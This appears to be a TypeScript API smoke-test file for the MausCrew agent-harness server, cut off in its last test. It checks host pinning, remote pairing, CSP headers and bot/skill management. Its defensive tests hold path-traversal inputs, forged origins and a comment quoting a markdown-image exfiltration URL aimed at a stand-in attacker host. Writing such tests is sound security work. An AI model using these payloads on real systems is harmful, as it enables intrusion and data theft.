// API smoke test: boots the real harness server (node server/index.ts)
// against a throwaway home directory and exercises the HTTP surface the
// app depends on. The config pins one deliberately-unknown driver so the
// suite is deterministic with or without agent CLIs installed — and pins
// the shadow-instance behavior end to end while it's at it.
import { spawn, type ChildProcess } from "node:child_process";
import { createServer, request, type Server } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { connect } from "node:net";

import { openSse } from "./testing/sse.ts";

const CRLF = "\r\n";

/** A literal request line on a raw socket — the only way to send no Host at
 * all, which `http.request` always supplies for us. */
const rawStatus = (requestLine: string): Promise<number> =>
  new Promise((resolve, reject) => {
    const socket = connect(PORT, "127.0.0.1", () => socket.write(requestLine));
    let buffer = "";
    socket.on("data", (chunk) => {
      buffer += chunk;
    });
    socket.on("error", reject);
    socket.on("close", () => resolve(Number(buffer.split(" ")[1] ?? 0)));
  });

const SERVER_DIR = dirname(fileURLToPath(import.meta.url));
const ROOT = join(SERVER_DIR, "..");
const PORT = 18800 + Math.floor(Math.random() * 10_000);
const BASE = `http://127.0.0.1:${PORT}`;
const WEBHOOK_PORT = 39000 + Math.floor(Math.random() * 10_000);
const WEBHOOK_BASE = `http://127.0.0.1:${WEBHOOK_PORT}`;

let child: ChildProcess;
/** stands in for the box provider so config saving never touches the network */
let boxStub: Server;
let boxStubPort = 0;
let home: string;
let staticDir: string;
let stderr = "";

const api = async (method: string, path: string, body?: unknown): Promise<{ status: number; body: any }> => {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: body ? { "content-type": "application/json" } : undefined,
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, body: await res.json() };
};

const statusWithHeaders = (headers: Record<string, string>): Promise<number> =>
  new Promise((resolve, reject) => {
    const req = request({ hostname: "127.0.0.1", port: PORT, path: "/api/health", headers }, (res) => {
      res.resume();
      resolve(res.statusCode ?? 0);
    });
    req.on("error", reject);
    req.end();
  });

const requestWithHeaders = (
  method: string,
  path: string,
  headers: Record<string, string>,
  body?: unknown,
): Promise<{ status: number; body: any; headers: Record<string, string | string[] | undefined> }> =>
  new Promise((resolve, reject) => {
    const data = body === undefined ? "" : JSON.stringify(body);
    const req = request(
      {
        hostname: "127.0.0.1",
        port: PORT,
        path,
        method,
        headers: { ...headers, ...(data ? { "content-type": "application/json", "content-length": Buffer.byteLength(data) } : {}) },
      },
      (res) => {
        let raw = "";
        res.on("data", (chunk) => (raw += chunk));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: raw ? JSON.parse(raw) : {}, headers: res.headers }));
      },
    );
    req.on("error", reject);
    req.end(data);
  });

beforeAll(async () => {
  home = mkdtempSync(join(tmpdir(), "mauscrew-api-test-"));
  staticDir = join(home, "static");
  // a fleet of exactly one unknown driver: no CLI probes, no network
  mkdirSync(join(home, ".mauscrew"), { recursive: true });
  mkdirSync(join(staticDir, "assets"), { recursive: true });
  writeFileSync(join(staticDir, "index.html"), "<!doctype html><title>Packaged MausCrew</title>");
  writeFileSync(join(staticDir, "assets", "smoke.css"), "body { color: white; }");
  writeFileSync(join(staticDir, "manifest.webmanifest"), JSON.stringify({ name: "MausCrew Remote" }));
  // a sibling of the static root, so an escape would be observable
  writeFileSync(join(home, "outside.txt"), "must never be served");
  writeFileSync(
    join(home, ".mauscrew", "config.json"),
    JSON.stringify({ instances: { ghost: { driver: "not-a-real-driver", displayName: "Ghost" } } }),
  );

  boxStub = createServer(async (req, res) => {
    if (req.url?.startsWith("/api/v3.1/tool_router/session")) {
      if (req.headers["x-api-key"] !== "ak_good") {
        res.writeHead(401, { "content-type": "application/json" });
        return res.end(JSON.stringify({ error: { message: "invalid project key" } }));
      }
      let raw = "";
      for await (const chunk of req) raw += chunk;
      const body = raw ? JSON.parse(raw) : {};
      res.writeHead(201, { "content-type": "application/json" });
      return res.end(JSON.stringify({
        session_id: "trs_config_test",
        mcp: { type: "http", url: "https://app.composio.dev/tool_router/v3/trs_config_test/mcp" },
        config: { user_id: body.user_id },
      }));
    }
    const ok = req.headers.authorization === "Bearer box_good";
    res.writeHead(ok ? 200 : 401, { "content-type": "application/json" });
    res.end(JSON.stringify(ok ? { ok: true, boxes: [] } : { ok: false, code: "unauthorized" }));
  });
  await new Promise<void>((r) => boxStub.listen(0, "127.0.0.1", r));
  boxStubPort = (boxStub.address() as { port: number }).port;

  child = spawn(process.execPath, [join(SERVER_DIR, "index.ts")], {
    cwd: ROOT,
    env: {
      ...(process.env.PATH ? { PATH: process.env.PATH } : {}),
      ...(process.env.SystemRoot ? { SystemRoot: process.env.SystemRoot } : {}),
      HOME: home,
      USERPROFILE: home,
      MAUSCREW_PORT: String(PORT),
      MAUSCREW_WEBHOOK_PORT: String(WEBHOOK_PORT),
      MAUSCREW_BOX_API: `http://127.0.0.1:${boxStubPort}`,
      MAUSCREW_COMPOSIO_API: `http://127.0.0.1:${boxStubPort}/api/v3.1`,
      MAUSCREW_STATIC_DIR: staticDir,
    },
    stdio: ["ignore", "pipe", "pipe"],
  });
  child.stderr!.on("data", (c) => (stderr += c));

  const deadline = Date.now() + 20_000;
  for (;;) {
    try {
      const res = await fetch(`${BASE}/api/health`);
      if (res.ok) break;
    } catch {
      /* not up yet */
    }
    if (Date.now() > deadline) throw new Error(`server never came up. stderr:\n${stderr}`);
    if (child.exitCode !== null) throw new Error(`server exited ${child.exitCode}. stderr:\n${stderr}`);
    await new Promise((r) => setTimeout(r, 150));
  }
}, 30_000);

afterAll(async () => {
  boxStub?.close();
  child?.kill("SIGTERM");
  await new Promise<void>((resolve) => {
    if (!child || child.exitCode !== null) return resolve();
    child.on("close", () => resolve());
    setTimeout(() => (child.kill("SIGKILL"), resolve()), 5_000).unref?.();
  });
  rmSync(home, { recursive: true, force: true });
});

describe("harness HTTP API", () => {
  it("rejects a phone message when another device changed the active task", async () => {
    const created = await api("POST", "/api/bots");
    const botId = created.body.bot.id;
    try {
      const first = await api("POST", `/api/bots/${botId}/tasks`, {});
      const second = await api("POST", `/api/bots/${botId}/tasks`, {});
      const response = await api("POST", `/api/bots/${botId}/messages`, {
        text: "Must stay in the phone task",
        expectedThreadId: first.body.bot.threadId,
      });
      expect(response.status).toBe(409);
      expect(response.body.error).toContain("başka bir cihazda");
      const snapshot = await api("GET", "/api/bots");
      const bot = snapshot.body.bots.find((item: { id: string }) => item.id === botId);
      expect(bot.threadId).toBe(second.body.bot.threadId);
      expect(bot.messages.some((message: { text?: string }) => message.text === "Must stay in the phone task")).toBe(false);
    } finally {
      await api("DELETE", `/api/bots/${botId}`);
    }
  });

  it("rejects non-loopback authorities while accepting IPv4 and IPv6 loopback forms", async () => {
    expect(await statusWithHeaders({ host: "example.com" })).toBe(403);
    expect(await statusWithHeaders({ origin: "https://example.com" })).toBe(403);
    expect(await statusWithHeaders({ host: `127.0.0.2:${PORT}` })).toBe(200);
    expect(await statusWithHeaders({ host: `[::1]:${PORT}` })).toBe(200);
    expect(await statusWithHeaders({ origin: `http://[::1]:${PORT}` })).toBe(200);
  });

  // Regression: `remoteUrl?.host === req.headers.host?.toLowerCase()` compared
  // undefined to undefined when remote access was off, so a Host-less request
  // skipped the untrusted-host refusal and read as a remote one. Must be 403
  // (untrusted host), never 401 (pairing required) or 200.
  it("refuses a request that carries no Host header at all", async () => {
    expect(await rawStatus("GET /api/health HTTP/1.0" + CRLF + CRLF)).toBe(403);
    expect(await rawStatus("POST /api/remote/claim HTTP/1.0" + CRLF + CRLF)).toBe(403);
  });

  it("requires one-time desktop pairing on the configured remote HTTPS host", async () => {
    const host = "mauscrew-test.example";
    const origin = `https://${host}`;
    expect((await api("PUT", "/api/config", { remoteAccess: { enabled: true, publicUrl: origin } })).status).toBe(200);

    const pairing = await api("POST", "/api/remote/pairings", {});
    expect(pairing.status).toBe(201);
    expect((await requestWithHeaders("GET", "/api/bots", { host, origin })).status).toBe(401);

    const claimed = await requestWithHeaders("POST", "/api/remote/claim", { host, origin }, {
      code: pairing.body.code,
      name: "Integration phone",
    });
    expect(claimed.status).toBe(200);
    const setCookie = claimed.headers["set-cookie"];
    const cookie = (Array.isArray(setCookie) ? setCookie[0] : String(setCookie)).split(";", 1)[0];
    expect(cookie).toMatch(/^mauscrew_remote=/);
    expect((await requestWithHeaders("GET", "/api/bots", { host, origin, cookie })).status).toBe(200);
    expect((await requestWithHeaders("PUT", "/api/config", { host, origin, cookie }, { profile: { name: "remote" } })).status).toBe(403);
    expect((await requestWithHeaders("GET", "/api/bots", { host, origin: "https://evil.example", cookie })).status).toBe(403);
  });

  it("reports and stores the analytics opt-out as a boolean", async () => {
    expect((await api("GET", "/api/config")).body.analytics).toEqual({ enabled: true, locked: false });

    expect((await api("PUT", "/api/config", { analytics: { enabled: "no" } })).status).toBe(400);
    expect((await api("PUT", "/api/config", { analytics: true })).status).toBe(400);

    expect((await api("PUT", "/api/config", { analytics: { enabled: false } })).status).toBe(200);
    expect((await api("GET", "/api/config")).body.analytics).toEqual({ enabled: false, locked: false });
    expect(JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8")).analytics).toEqual({
      enabled: false,
    });

    expect((await api("PUT", "/api/config", { analytics: { enabled: true } })).status).toBe(200);
    expect((await api("GET", "/api/config")).body.analytics.enabled).toBe(true);
  });

  it("stores and clears a desktop-only shared workspace", async () => {
    const workspace = join(home, "projects", "shared-workspace");
    expect((await api("GET", "/api/shared-workspace")).body).toEqual({ path: "" });

    const saved = await api("PUT", "/api/shared-workspace", { path: workspace });
    expect(saved).toEqual({ status: 200, body: { path: workspace } });
    expect((await api("GET", "/api/shared-workspace")).body).toEqual({ path: workspace });
    expect(JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8")).sharedWorkspacePath).toBe(workspace);

    expect((await api("PUT", "/api/shared-workspace", { path: "relative/workspace" })).status).toBe(400);
    expect((await api("PUT", "/api/shared-workspace", { path: home })).status).toBe(400);

    expect((await api("PUT", "/api/shared-workspace", { path: "" })).body).toEqual({ path: "" });
    expect((await api("GET", "/api/shared-workspace")).body).toEqual({ path: "" });
    expect(JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8")).sharedWorkspacePath).toBeUndefined();
  });

  it("identifies itself on /api/health", async () => {
    const { status, body } = await api("GET", "/api/health");
    expect(status).toBe(200);
    expect(body.app).toBe("mauscrew");
    expect(typeof body.pid).toBe("number");
    expect(body.static).toBe(true);
    // one owner name, one source — the health payload used to hardcode a
    // different one than package.json and nothing noticed
    const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
    expect(body.owner.name).toBe(pkg.author.name);
    expect(body.owner.name).toBeTruthy();
  });

  it("serves packaged UI assets and preserves API 404s", async () => {
    const root = await fetch(`${BASE}/`);
    expect(root.status).toBe(200);
    expect(root.headers.get("content-type")).toBe("text/html");
    expect(await root.text()).toContain("Packaged MausCrew");

    const asset = await fetch(`${BASE}/assets/smoke.css`);
    expect(asset.status).toBe(200);
    expect(asset.headers.get("content-type")).toBe("text/css");
    expect(await asset.text()).toContain("color: white");

    const spa = await fetch(`${BASE}/settings/desktop`);
    expect(spa.status).toBe(200);
    expect(spa.headers.get("content-type")).toBe("text/html");
    expect(await spa.text()).toContain("Packaged MausCrew");

    const unknownApi = await api("GET", "/api/not-a-real-route");
    expect(unknownApi.status).toBe(404);
    expect(unknownApi.body.error).toContain("/api/not-a-real-route");
  });

  it("hardens every static response and types the PWA manifest correctly", async () => {
    const shell = await fetch(`${BASE}/`);
    expect(shell.headers.get("x-content-type-options")).toBe("nosniff");
    expect(shell.headers.get("cache-control")).toBe("no-cache");
    const csp = shell.headers.get("content-security-policy") ?? "";
    // the exfiltration channel this policy exists to close: a bot reply's
    // `![](https://attacker/?d=…)` must not be a request the renderer makes
    expect(csp).toContain("img-src 'self' data: blob:");
    expect(csp).not.toContain("img-src 'self' data: blob: https:");
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    // load-bearing: the Windows dictation AudioWorklet is built from a Blob
    expect(csp).toContain("script-src 'self' blob:");

    // served as application/octet-stream before, which is not a manifest
    const manifest = await fetch(`${BASE}/manifest.webmanifest`);
    expect(manifest.status).toBe(200);
    expect(manifest.headers.get("content-type")).toBe("application/manifest+json");

    // hashed asset names are the only thing safe to cache forever
    const asset = await fetch(`${BASE}/assets/smoke.css`);
    expect(asset.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
    expect(asset.headers.get("content-security-policy")).toBe(csp);
  });

  it("never serves a file outside the static root", async () => {
    // WHATWG URL normalisation already eats `..` before the handler sees it,
    // so these are not live exploits — they pin the containment check that now
    // stands on its own instead of depending on that happening to run first.
    for (const path of ["/../outside.txt", "/..%2f..%2foutside.txt", "/....//outside.txt", "/assets/../../outside.txt"]) {
      const res = await fetch(`${BASE}${path}`);
      const body = await res.text();
      expect(body).not.toContain("must never be served");
      expect(body).toContain("Packaged MausCrew");
    }
  });

  it("rejects malformed and oversized JSON bodies without hanging", async () => {
    const malformed = await fetch(`${BASE}/api/config`, {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: "{",
    });
    expect(malformed.status).toBe(400);
    expect(await malformed.json()).toEqual({ error: "invalid JSON body" });

    const oversized = await fetch(`${BASE}/api/config`, {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ profile: { name: "x".repeat(1_000_001) } }),
    });
    expect(oversized.status).toBe(413);
    expect(await oversized.json()).toEqual({ error: "body too large" });

    expect((await fetch(`${BASE}/api/health`)).status).toBe(200);
  });

  it("seeds one starter bot with its greeting", async () => {
    const { status, body } = await api("GET", "/api/bots");
    expect(status).toBe(200);
    expect(body.bots.length).toBeGreaterThanOrEqual(1);
    expect(body.bots[0].messages.length).toBeGreaterThanOrEqual(2);
  });

  it("describes the configured fleet, shadows included", async () => {
    const { status, body } = await api("GET", "/api/instances");
    expect(status).toBe(200);
    expect(body.instances).toHaveLength(1);
    expect(body.instances[0]).toMatchObject({
      instanceId: "ghost",
      driverKind: "not-a-real-driver",
      displayName: "Ghost",
      snapshot: { state: "unavailable" },
    });
    expect(body.instances[0].snapshot.reason).toContain("not-a-real-driver");
  });

  it("creates, patches, and deletes a bot", async () => {
    const created = await api("POST", "/api/bots");
    expect(created.status).toBe(201);
    const bot = created.body.bot;

    const workspacePath = join(home, "projects", "selected-workspace");
    const patched = await api("PATCH", `/api/bots/${bot.id}`, {
      name: "Renamed",
      pinned: true,
      section: "Work & projects",
      workspacePath,
      dynamicCordis: true,
    });
    expect(patched.status).toBe(200);
    expect(patched.body.bot).toMatchObject({ name: "Renamed", pinned: true, section: "Work & projects", workspacePath, dynamicCordis: true });

    expect((await api("PATCH", `/api/bots/${bot.id}`, { workspacePath: "relative/project" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { workspacePath: home })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { dynamicCordis: "yes" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { section: "x".repeat(65) })).status).toBe(400);
    const cleared = await api("PATCH", `/api/bots/${bot.id}`, { workspacePath: "" });
    expect(cleared.status).toBe(200);
    expect(cleared.body.bot.workspacePath).toBeUndefined();

    // A chosen avatar is stored inline, so the shape and the ceiling are both
    // enforced here rather than trusted from the renderer.
    const png = `data:image/png;base64,${Buffer.from("fake-png").toString("base64")}`;
    const withAvatar = await api("PATCH", `/api/bots/${bot.id}`, { avatarImage: png });
    expect(withAvatar.status).toBe(200);
    expect(withAvatar.body.bot.avatarImage).toBe(png);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { avatarImage: "https://example.com/a.png" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { avatarImage: "data:image/svg+xml;base64,PHN2Zz4=" })).status).toBe(400);
    expect((await api("PATCH", `/api/bots/${bot.id}`, {
      avatarImage: `data:image/png;base64,${"A".repeat(200_001)}`,
    })).status).toBe(400);
    const clearedAvatar = await api("PATCH", `/api/bots/${bot.id}`, { avatarImage: "" });
    expect(clearedAvatar.status).toBe(200);
    expect(clearedAvatar.body.bot.avatarImage).toBeUndefined();

    const missing = await api("PATCH", "/api/bots/does-not-exist", { name: "x" });
    expect(missing.status).toBe(404);

    const deleted = await api("DELETE", `/api/bots/${bot.id}`);
    expect(deleted.status).toBe(200);
    const after = await api("GET", "/api/bots");
    expect(after.body.bots.find((b: { id: string }) => b.id === bot.id)).toBeUndefined();
  });

  it("manages workspace skills without exposing arbitrary filesystem paths", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    // A bot with no workspace of its own still gets a skills home rather
    // than a 409 — requiring the user to pick a folder first is what kept
    // skills (and teach-from-task) out of reach on every engine but DeepSeek.
    const unset = await api("GET", `/api/bots/${bot.id}/skills`);
    expect(unset.status).toBe(200);
    expect(unset.body.skills).toEqual([]);
    expect(unset.body.workspacePath).toContain("workspaces");

    const workspacePath = join(home, "projects", "skill-workspace");
    expect((await api("PATCH", `/api/bots/${bot.id}`, { workspacePath })).status).toBe(200);
    const empty = await api("GET", `/api/bots/${bot.id}/skills`);
    expect(empty.status).toBe(200);
    expect(empty.body.skills).toEqual([]);
    expect(empty.body.rootPath).toBe(realpathSync(join(workspacePath, ".agents", "skills")));

    const invalid = await api("POST", `/api/bots/${bot.id}/skills`, {
      name: "../escape",
      description: "No",
      instructions: "No",
    });
    expect(invalid.status).toBe(400);

    const created = await api("POST", `/api/bots/${bot.id}/skills`, {
      name: "review-change",
      description: "Review the current change.",
      whenToUse: "Before delivery.",
      instructions: "Inspect the diff and run tests.",
      userInvocable: true,
      modelInvocable: true,
    });
    expect(created.status).toBe(201);
    expect(created.body.skill).toMatchObject({ id: "review-change", valid: true });
    expect(existsSync(join(workspacePath, ".agents", "skills", "review-change", "SKILL.md"))).toBe(true);

    const updated = await api("PUT", `/api/bots/${bot.id}/skills/review-change`, {
      name: "review-change",
      description: "Review and verify the current change.",
      instructions: "Inspect the diff, run tests, and report findings.",
      userInvocable: true,
      modelInvocable: false,
    });
    expect(updated.status).toBe(200);
    expect(updated.body.skill.modelInvocable).toBe(false);

    const listed = await api("GET", `/api/bots/${bot.id}/skills`);
    expect(listed.body.skills).toHaveLength(1);
    expect(listed.body.skills[0].description).toContain("verify");

    expect((await api("DELETE", `/api/bots/${bot.id}/skills/review-change`)).status).toBe(200);
    expect((await api("GET", `/api/bots/${bot.id}/skills`)).body.skills).toEqual([]);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("keeps project rooms, context resources, and manual takeover server-backed", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const workspacePath = join(home, "project-workspace");
    mkdirSync(workspacePath, { recursive: true });
    const created = await api("POST", "/api/projects", {
      name: "Launch Project",
      description: "Isolated launch context",
      workspacePath,
      instructions: "Never mix this launch with another project.",
      resources: [{ label: "Brief", value: "docs/brief.md" }],
      memberIds: [bot.id],
    });
    expect(created.status).toBe(201);
    expect(created.body.group.projectId).toBe(created.body.project.id);
    expect(created.body.project.resources).toMatchObject([{ label: "Brief", value: "docs/brief.md" }]);

    const secondRoom = await api("POST", "/api/groups", {
      name: "Release Room",
      memberIds: [bot.id],
      projectId: created.body.project.id,
    });
    expect(secondRoom.status).toBe(201);
    expect(secondRoom.body.group.projectId).toBe(created.body.project.id);
    expect((await api("GET", "/api/projects")).body.projects[0].roomIds).toEqual(
      expect.arrayContaining([created.body.group.id, secondRoom.body.group.id]),
    );

    expect((await api("DELETE", `/api/groups/${secondRoom.body.group.id}`)).status).toBe(200);
    expect((await api("GET", "/api/projects")).body.projects[0].roomIds).not.toContain(secondRoom.body.group.id);

    // Manual input is refused while the bot still holds the pointer, so a
    // stray click cannot land in the middle of a turn.
    const beforeTakeover = await api("POST", `/api/bots/${bot.id}/computer/input`, { kind: "click", x: 10, y: 10 });
    expect(beforeTakeover.status).toBe(409);
    expect(beforeTakeover.body.error).toContain("take control first");

    const takeover = await api("POST", `/api/bots/${bot.id}/takeover`, { active: true });
    expect(takeover.status).toBe(200);
    expect(takeover.body.bot.humanTakeover.active).toBe(true);

    // Under control, but this test fleet has no cloud computer configured —
    // the route must say so rather than pretending the click landed.
    const withoutBox = await api("POST", `/api/bots/${bot.id}/computer/input`, { kind: "click", x: 10, y: 10 });
    expect(withoutBox.status).toBe(409);
    expect(withoutBox.body.error).toContain("cloud computer");
    const badInput = await api("POST", `/api/bots/${bot.id}/computer/input`, { kind: "drag" });
    expect(badInput.status).toBe(400);

    const returned = await api("POST", `/api/bots/${bot.id}/takeover`, { active: false });
    expect(returned.status).toBe(200);
    expect(returned.body.bot.humanTakeover).toBeUndefined();

    expect((await api("DELETE", `/api/projects/${created.body.project.id}`)).status).toBe(200);
    const hydrated = await api("GET", "/api/bots");
    expect(hydrated.body.projects).toEqual([]);
    expect(hydrated.body.groups.find((group: { id: string }) => group.id === created.body.group.id).projectId).toBeUndefined();
    expect((await api("DELETE", `/api/groups/${created.body.group.id}`)).status).toBe(200);
    expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
  });

  it("exports selected bots without a room and imports the team with fresh IDs", async () => {
    const first = (await api("POST", "/api/bots")).body.bot;
    const second = (await api("POST", "/api/bots")).body.bot;
    await api("PATCH", `/api/bots/${first.id}`, {
      name: "Mira",
      title: "Project Lead",
      description: "Coordinates the crew",
      color: "purple",
      autoApprove: true,
      alwaysAllow: ["Bash:git"],
    });
    await api("PATCH", `/api/bots/${second.id}`, {
      name: "Scout",
      title: "Researcher",
      description: "Finds evidence",
      color: "cyan",
    });

    const roomsBeforeSelectionExport = (await api("GET", "/api/bots")).body.groups.length;
    const selectedExport = await api("POST", "/api/teams/export", {
      name: "Field Team",
      memberIds: [first.id, second.id],
    });
    expect(selectedExport.status).toBe(200);
    expect(selectedExport.body).toMatchObject({
      format: "mauscrew.team",
      version: 1,
      team: {
        name: "Field Team",
        members: [
          { key: "mira", name: "Mira", title: "Project Lead", appearance: { color: "purple" } },
          { key: "scout", name: "Scout", title: "Researcher", appearance: { color: "cyan" } },
        ],
        room: {
          name: "Field Team",
          bulletin: "",
          defaultResponder: { kind: "everyone" },
        },
      },
    });
    expect(JSON.stringify(selectedExport.body)).not.toMatch(/autoApprove|alwaysAllow|modelSelection|threadId/);
    expect((await api("GET", "/api/bots")).body.groups).toHaveLength(roomsBeforeSelectionExport);
    expect((await api("POST", "/api/teams/export", { name: "", memberIds: [first.id] })).status).toBe(400);
    expect((await api("POST", "/api/teams/export", { name: "Empty", memberIds: [] })).status).toBe(400);
    expect((await api("POST", "/api/teams/export", { name: "Missing", memberIds: ["no-such-bot"] })).status).toBe(400);

    const importManifest = structuredClone(selectedExport.body);
    importManifest.team.room = {
      name: "Launch Crew",
      bulletin: "Prepare the launch together",
      defaultResponder: { kind: "member", member: "scout" },
    };

    const stream = await openSse(`${BASE}/api/events`);
    try {
      await stream.until((frame) => frame.kind === "hello");
      const imported = await api("POST", "/api/teams/import", importManifest);
      expect(imported.status).toBe(201);
      // Imported INTO the workspace they were exported from, so both names are
      // already taken and the copies get numbered. A team file opened in a
      // workspace that has neither name keeps them exactly as written — the
      // rule only fires on a collision, because two bots with one name make
      // `@Mira` resolve to whichever the matcher reaches first.
      expect(imported.body.bots.map((bot: { name: string }) => bot.name)).toEqual(["Mira 2", "Scout 2"]);
      expect(imported.body.bots.every((bot: { id: string }) => ![first.id, second.id].includes(bot.id))).toBe(true);
      expect(imported.body.bots[0]).not.toHaveProperty("alwaysAllow");
      expect(imported.body.group.memberIds).toEqual(imported.body.bots.map((bot: { id: string }) => bot.id));
      expect(imported.body.group.defaultResponder).toEqual({ kind: "member", botId: imported.body.bots[1].id });

      await stream.until((frame) => frame.kind === "group" && frame.group?.id === imported.body.group.id);
      const importedBotIds = new Set(imported.body.bots.map((bot: { id: string }) => bot.id));
      const importFrames = stream.frames.filter(
        (frame) =>
          (frame.kind === "bot" && importedBotIds.has(frame.bot?.id)) ||
          (frame.kind === "group" && frame.group?.id === imported.body.group.id),
      );
      expect(importFrames.map((frame) => frame.kind)).toEqual(["bot", "bot", "group"]);

      const invalid = await api("POST", "/api/teams/import", { ...importManifest, version: 2 });
      expect(invalid.status).toBe(400);

      expect((await api("DELETE", `/api/groups/${imported.body.group.id}`)).status).toBe(200);
      for (const bot of [first, second, ...imported.body.bots]) {
        expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
      }
    } finally {
      stream.close();
    }
  });

  it("packages a bot's skills and memory, and installs exactly what the file says", async () => {
    // A shared bot that carries only its prompt arrives able to describe the
    // job and unable to do it. The package carries the playbooks too, and the
    // install writes them directly: no turn is run, so what the receiving
    // user reviewed is what ends up on disk.
    const source = (await api("POST", "/api/bots")).body.bot;
    await api("PATCH", `/api/bots/${source.id}`, { name: "Packager", title: "Research" });
    expect(
      (await api("POST", `/api/bots/${source.id}/skills`, {
        name: "connect-navimow",
        description: "Connect a Segway Navimow",
        whenToUse: "use this when the user needs to connect a mower",
        instructions: "# Connect\n\nSign in, then finish first-run setup.",
      })).status,
    ).toBe(201);

    // skills ride along by default; memory only when asked for
    const withoutMemory = await api("POST", "/api/teams/export", { name: "Pack", memberIds: [source.id] });
    expect(withoutMemory.body.team.members[0].skills).toHaveLength(1);
    expect(withoutMemory.body.team.members[0]).not.toHaveProperty("memory");

    const optedOut = await api("POST", "/api/teams/export", {
      name: "Pack",
      memberIds: [source.id],
      include: { skills: false },
    });
    expect(optedOut.body.team.members[0]).not.toHaveProperty("skills");

    // a file that also carries memory installs it as the bot's own profile
    const manifest = structuredClone(withoutMemory.body);
    manifest.team.members[0].memory = "Never mow before confirming the lawn is clear.";

    const imported = await api("POST", "/api/teams/import", manifest);
    expect(imported.status).toBe(201);
    expect(imported.body.installed).toEqual({ skills: 1, memories: 1 });

    const copy = imported.body.bots[0];
    const installedSkills = await api("GET", `/api/bots/${copy.id}/skills`);
    expect(installedSkills.body.skills.map((skill: { id: string }) => skill.id)).toEqual(["connect-navimow"]);
    expect(installedSkills.body.skills[0].whenToUse).toContain("connect a mower");
    expect((await api("GET", `/api/bots/${copy.id}/memory`)).body.profile).toBe(
      "Never mow before confirming the lawn is clear.",
    );
    // the sender's own bot is untouched by the round trip
    expect((await api("GET", `/api/bots/${source.id}/memory`)).body.profile).toBe("");

    // a package the parser rejects creates nothing at all
    const poisoned = structuredClone(manifest);
    poisoned.team.members[0].skills = [{ name: "../escape", description: "x", instructions: "y" }];
    const before = (await api("GET", "/api/bots")).body.bots.length;
    expect((await api("POST", "/api/teams/import", poisoned)).status).toBe(400);
    expect((await api("GET", "/api/bots")).body.bots).toHaveLength(before);

    expect((await api("DELETE", `/api/groups/${imported.body.group.id}`)).status).toBe(200);
    for (const bot of [source, ...imported.body.bots]) {
      expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
    }
  });

  it("keeps the rest of a duplicate's fields when the source engine is offline", async () => {
    // duplicateBot POSTs a blank bot, then PATCHes the source's whole
    // modelSelection in one body beside its name, title and description.
    // "ghost" is an unknown driver, so the registry resolves nothing and the
    // level cannot be verified — which must not cost the copy everything
    // else in the request.
    const copy = (await api("POST", "/api/bots")).body.bot;

    const patched = await api("PATCH", `/api/bots/${copy.id}`, {
      name: "Reviewer copy",
      title: "Reviewer",
      description: "reads diffs",
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "xhigh" },
    });

    expect(patched.status).toBe(200);
    expect(patched.body.bot).toMatchObject({
      name: "Reviewer copy",
      title: "Reviewer",
      description: "reads diffs",
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "xhigh" },
    });
  });

  it("rejects an unknown effort value even while the engine is offline", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const patched = await api("PATCH", `/api/bots/${bot.id}`, {
      modelSelection: { instanceId: "ghost", model: "ghost-1", effort: "turbo" },
    });

    expect(patched.status).toBe(400);
    expect(patched.body.error).toContain("not recognized");
  });

  it("leaves a bot with no effort level untouched", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    expect(bot.modelSelection.effort).toBeUndefined();

    const renamed = await api("PATCH", `/api/bots/${bot.id}`, { name: "Plain" });
    expect(renamed.status).toBe(200);
    expect(renamed.body.bot.modelSelection.effort).toBeUndefined();
  });

  // This fixture pins a single unknown driver, so no instance here ever
  // resolves: these cover the gate's pass-through and the store's replace
  // semantics, NOT the comparison against a live engine's declared list.
  // That branch has no coverage at this layer, and manufacturing a live
  // instance in this fixture would cost it its no-probe determinism.
  it("round-trips an effort level and clears it when the key is dropped", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const selection = { instanceId: "ghost", model: "ghost-1" };

    const set = await api("PATCH", `/api/bots/${bot.id}`, {
      modelSelection: { ...selection, effort: "high" },
    });
    expect(set.status).toBe(200);
    expect(set.body.bot.modelSelection.effort).toBe("high");

    const reread = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
    expect(reread.modelSelection.effort).toBe("high");

    // The panel's "Default" button spreads the selection with effort:
    // undefined, and JSON.stringify drops the key — so clearing reaches the
    // server as a modelSelection carrying no effort at all.
    const cleared = await api("PATCH", `/api/bots/${bot.id}`, { modelSelection: selection });
    expect(cleared.status).toBe(200);

    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
    expect(after.modelSelection).toEqual(selection);
    expect(after.modelSelection.effort).toBeUndefined();
  });

  it("persists an answered onboarding card", async () => {
    const { body } = await api("GET", "/api/bots");
    const bot = body.bots[0];
